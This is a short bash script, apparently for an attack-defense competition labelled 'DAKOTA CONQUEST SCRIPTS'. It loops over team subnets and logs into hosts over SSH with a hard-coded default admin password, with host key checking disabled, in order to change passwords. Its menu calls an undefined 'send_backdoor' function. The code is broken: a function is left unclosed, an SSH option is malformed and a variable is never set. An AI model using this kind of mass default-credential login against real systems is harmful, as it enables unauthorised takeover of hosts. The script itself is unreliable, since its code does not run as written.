#!/bin/bash

IPs=()
network_id="10.10"
number_of_teams=10
host_ids=(10 20 30 40 50)
admin="admin1"
default_password="Password1!"
timeout_duration=1

update_passwords() {
    read -p "Team to update passwords: " team_number

    for IP in "${IPs[@]}"; do
    	team_number_from_IP=$(echo "$IP" | cut -d'.' -f3)

   	if [[ "$team_number_from_IP" == "$team_number" ]]; then
	    sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no ConnectTimeout=$timeout_duration "$user@$IP" "
       		echo \"$default_password\" | sudo -S passwd 
            "

}

main() {
    for ((team=1; team<=number_of_teams; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done

    while true; do
        echo "DAKOTA CONQUEST SCRIPTS"
        echo "1. Update Passwords"
        echo "2. Exit"
        read -p "Choose an option: " choice

        case $choice in
            1) send_backdoor ;;
            2) break ;;
            *) echo "Invalid choice. Please try again." ;;
        esac
    done
}

main
